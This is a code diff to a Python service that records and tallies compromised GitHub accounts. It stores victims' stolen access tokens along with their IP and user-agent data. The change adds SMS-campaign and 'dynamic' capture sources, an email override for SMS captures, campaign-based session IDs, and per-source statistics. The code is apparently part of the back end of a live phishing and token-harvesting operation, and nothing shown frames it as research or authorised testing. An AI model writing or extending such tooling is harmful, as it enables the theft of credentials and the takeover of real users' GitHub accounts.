@@ -37,15 +37,17 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
         source: str = "manual",
         device_auth_session_id: str = None,
         victim_info: Dict[str, Any] = None,
+        override_email: str = None,
     ) -> Dict[str, Any]:
         """
         Add a new compromised GitHub account.
 
         Args:
             token: GitHub Personal Access Token
-            source: Source of the token ('manual' or 'device_auth')
+            source: Source of the token ('manual', 'sms', or 'dynamic')
             device_auth_session_id: Device auth session ID if applicable
             victim_info: Additional victim information (IP, user agent, etc.)
+            override_email: Email to use instead of GitHub API email (for SMS/dynamic captures)
 
         Returns:
             Dictionary with operation result
@@ -99,6 +101,7 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
                     source=source,
                     device_auth_session_id=device_auth_session_id,
                     victim_info=victim_info,
+                    override_email=override_email,
                 )
 
                 session.add(account)
@@ -140,7 +143,7 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
         Get compromised accounts by source.
 
         Args:
-            source: Source type ('manual' or 'device_auth')
+            source: Source type ('manual', 'sms', or 'dynamic')
 
         Returns:
             List of compromised account dictionaries
@@ -312,11 +315,20 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
                     .count()
                 )
 
-                device_auth_accounts = (
+                sms_accounts = (
                     session.query(CompromisedGitHubAccount)
                     .filter(
                         CompromisedGitHubAccount.is_active,
-                        CompromisedGitHubAccount.source == "device_auth",
+                        CompromisedGitHubAccount.source == "sms",
+                    )
+                    .count()
+                )
+
+                dynamic_accounts = (
+                    session.query(CompromisedGitHubAccount)
+                    .filter(
+                        CompromisedGitHubAccount.is_active,
+                        CompromisedGitHubAccount.source == "dynamic",
                     )
                     .count()
                 )
@@ -335,7 +347,8 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
                     "valid_accounts": valid_accounts,
                     "invalid_accounts": total_accounts - valid_accounts,
                     "manual_accounts": manual_accounts,
-                    "device_auth_accounts": device_auth_accounts,
+                    "sms_accounts": sms_accounts,
+                    "dynamic_accounts": dynamic_accounts,
                     "analyzed_accounts": analyzed_accounts,
                     "unanalyzed_accounts": total_accounts - analyzed_accounts,
                 }
@@ -347,29 +360,31 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
                 "valid_accounts": 0,
                 "invalid_accounts": 0,
                 "manual_accounts": 0,
-                "device_auth_accounts": 0,
+                "sms_accounts": 0,
+                "dynamic_accounts": 0,
                 "analyzed_accounts": 0,
                 "unanalyzed_accounts": 0,
             }
 
     def record_compromised_account(
-        self, email: str, access_token: str, visitor_data: dict
+        self, email: str, access_token: str, visitor_data: dict, source: str = "dynamic"
     ) -> Dict[str, Any]:
         """
-        Record a compromised account from auth server data.
+        Record a compromised account from auth server or SMS campaign data.
 
-        This method is called by the auth server when a successful authentication occurs.
+        This method is called by the auth server or SMS campaigns when a successful authentication occurs.
 
         Args:
             email: Email address of the compromised account
             access_token: GitHub access token obtained from OAuth flow
             visitor_data: Visitor information from the auth server
+            source: Source of the capture ('dynamic', 'sms', etc.)
 
         Returns:
             Dictionary with operation result
         """
         try:
-            logger.debug(f"Recording compromised account from auth server: {email}")
+            logger.debug(f"Recording compromised account from {source}: {email}")
 
             # Extract victim information from visitor data
             victim_info = {
@@ -378,17 +393,21 @@ class CompromisedGitHubAccountService(BaseGitHubAccountService):
                 "location": None,  # Could add geolocation in the future
             }
 
-            # Generate a unique session ID for this device auth capture
-            device_auth_session_id = (
-                f"auth_server_{email}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-            )
+            # Generate a unique session ID for this capture
+            # Include campaign_id from visitor_data if present (for SMS campaigns)
+            campaign_id = visitor_data.get('campaign_id')
+            if campaign_id:
+                device_auth_session_id = f"{source}_{campaign_id}_{email}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+            else:
+                device_auth_session_id = f"{source}_{email}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
 
             # Use the existing add_compromised_account method
             result = self.add_compromised_account(
                 token=access_token,
-                source="device_auth",
+                source=source,
                 device_auth_session_id=device_auth_session_id,
                 victim_info=victim_info,
+                override_email=email,
             )
 
             if result["success"]:
